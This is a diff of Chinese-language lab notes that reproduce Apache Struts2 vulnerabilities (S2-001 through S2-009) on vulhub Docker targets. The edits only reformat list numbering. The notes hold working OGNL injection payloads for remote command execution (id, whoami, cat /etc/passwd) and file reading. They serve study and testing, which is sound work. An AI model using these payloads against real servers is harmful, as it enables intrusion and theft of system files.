@@ -12,7 +12,7 @@
 
 ### 漏洞复现
 
-1. 运行靶场
+运行靶场
 
 ```bash
 git clone https://github.com/vulhub/vulhub.git
@@ -20,15 +20,15 @@ cd vulhub/struts2/s2-001
 docker-compose up -d
 ```
 
-2. 访问 `http://your-ip:8080`，查看如下页面
+访问 `http://your-ip:8080` ，查看如下页面
 
 ![s2-001-1](images/s2-001-1.png)
 
-3. 在输入框中输入 OGNL 表达式 `%{1+1}`，点击提交，测试以下是否会执行表达式，查看如下页面
+在输入框中输入 OGNL 表达式 `%{1+1}` ，点击提交，测试以下是否会执行表达式，查看如下页面
 
 ![s2-001-2](images/s2-001-2.png)
 
-4. 在输入框中输入如下 OGNL 表达式获取 Tomcat 的路径，点击提交，查看如下页面
+在输入框中输入如下 OGNL 表达式获取 Tomcat 的路径，点击提交，查看如下页面
 
 ```
 %{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
@@ -36,7 +36,7 @@ docker-compose up -d
 
 ![s2-001-3](images/s2-001-3.png)
 
-5. 在输入框中输入如下 OGNL 表达式获取当前站点的真实路径，点击提交，查看如下页面
+在输入框中输入如下 OGNL 表达式获取当前站点的真实路径，点击提交，查看如下页面
 
 ```
 %{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}
@@ -44,7 +44,7 @@ docker-compose up -d
 
 ![s2-001-4](images/s2-001-4.png)
 
-6. 在输入框中输入如下 OGNL 表达式执行 `whoami` 命令，点击提交，查看如下页面
+在输入框中输入如下 OGNL 表达式执行 `whoami` 命令，点击提交，查看如下页面
 
 ```
 %{
@@ -62,7 +62,7 @@ docker-compose up -d
 
 ![s2-001-5](images/s2-001-5.png)
 
-7. 在输入框中输入如下 OGNL 表达式执行 `cat /etc/passwd` 命令，点击提交，查看如下页面
+在输入框中输入如下 OGNL 表达式执行 `cat /etc/passwd` 命令，点击提交，查看如下页面
 
 ```
 %{
@@ -96,7 +96,7 @@ s2-005 漏洞的起源源于 s2-003（受影响版本：低于 Struts2.0.12）�
 
 ### 漏洞复现
 
-1. 运行靶场
+运行靶场
 
 ```bash
 git clone https://github.com/vulhub/vulhub.git
@@ -104,11 +104,11 @@ cd vulhub/struts2/s2-005
 docker-compose up -d
 ```
 
-2. 访问 `http://your-ip:8080`，查看如下页面
+访问 `http://your-ip:8080` ，查看如下页面
 
 ![s2-005-1](images/s2-005-1.png)
 
-3. 无回显命令执行 PoC (GET)
+无回显命令执行 PoC (GET)
 
 ```
 (%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1
@@ -116,7 +116,7 @@ docker-compose up -d
 
 ![s2-005-2](images/s2-005-2.png)
 
-4. 有回显命令执行 PoC (POST)
+有回显命令执行 PoC (POST)
 
 ```
 POST /example/HelloWorld.action HTTP/1.1
@@ -131,7 +131,7 @@ redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%
 
 ???+ tip "最好将需要执行的命令进行 urlencode 编码"
 
-`cat /etc/passwd` -> `%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64`
+	 `cat /etc/passwd` -> `%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64`
 
 ![s2-005-3](images/s2-005-3.png)
 
@@ -149,7 +149,7 @@ redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%
 
 ### 漏洞复现
 
-1. 运行靶场
+运行靶场
 
 ```bash
 git clone https://github.com/vulhub/vulhub.git
@@ -157,11 +157,11 @@ cd vulhub/struts2/s2-007
 docker-compose up -d
 ```
 
-2. 访问 `http://your-ip:8080`，查看如下页面，在 age 输入框中输入非整数字符，点击提交，此时如果输入不正确的数据类型，会校验失败并提示，如下图
+访问 `http://your-ip:8080` ，查看如下页面，在 age 输入框中输入非整数字符，点击提交，此时如果输入不正确的数据类型，会校验失败并提示，如下图
 
 ![s2-007-1](images/s2-007-1.png)
 
-3. 任意命令执行 PoC，执行 `id` 命令
+任意命令执行 PoC，执行 `id` 命令
 
 ```
 name=a&email=a&age=%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29+%2B+%27
@@ -169,7 +169,7 @@ name=a&email=a&age=%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5
 
 ![s2-007-2](images/s2-007-2.png)
 
-4. 任意命令执行 PoC，执行 `cat /etc/passwd` 命令
+任意命令执行 PoC，执行 `cat /etc/passwd` 命令
 
 ```
 name=a&email=a&age=%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29.getInputStream%28%29%29%29+%2B+%27
@@ -187,7 +187,7 @@ S2-008 还是对 S2-003 的绕过，通过 S2-003/S2-005 ，Struts 2 为了阻�
 
 ### 漏洞复现
 
-1. 运行靶场
+运行靶场
 
 ```bash
 git clone https://github.com/vulhub/vulhub.git
@@ -195,11 +195,11 @@ cd vulhub/struts2/s2-008
 docker-compose up -d
 ```
 
-2. 访问 `http://your-ip:8080`，查看如下页面
+访问 `http://your-ip:8080` ，查看如下页面
 
 ![s2-008-1](images/s2-008-1.png)
 
-3. devMode 模式导致的 RCE, PoC 如下
+devMode 模式导致的 RCE, PoC 如下
 
 ```
 /devmode.action?debug=command&expression=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=id
@@ -223,7 +223,7 @@ ParametersInterceptor 中的正则表达式将 top ['foo']（0）作为有效的
 
 ### 漏洞复现
 
-1. 运行靶场
+运行靶场
 
 ```bash
 git clone https://github.com/vulhub/vulhub.git
@@ -231,11 +231,11 @@ cd vulhub/struts2/s2-009
 docker-compose up -d
 ```
 
-2. 访问 `http://your-ip:8080`，查看如下页面
+访问 `http://your-ip:8080` ，查看如下页面
 
 ![s2-009-1](images/s2-009-1.png)
 
-3. 任意命令执行 PoC，执行 `id` 命令
+任意命令执行 PoC，执行 `id` 命令
 
 ```
 /showcase.action/ajax/example5.action?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27id%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]
@@ -244,7 +244,7 @@ docker-compose up -d
 
 ![s2-009-2](images/s2-009-2.png)
 
-4. 任意文件读取 PoC，读取 `/etc/passwd` 文件
+任意文件读取 PoC，读取 `/etc/passwd` 文件
 
 ```
 /showcase.action/ajax/example5.action?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27cat%20/etc/passwd%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]
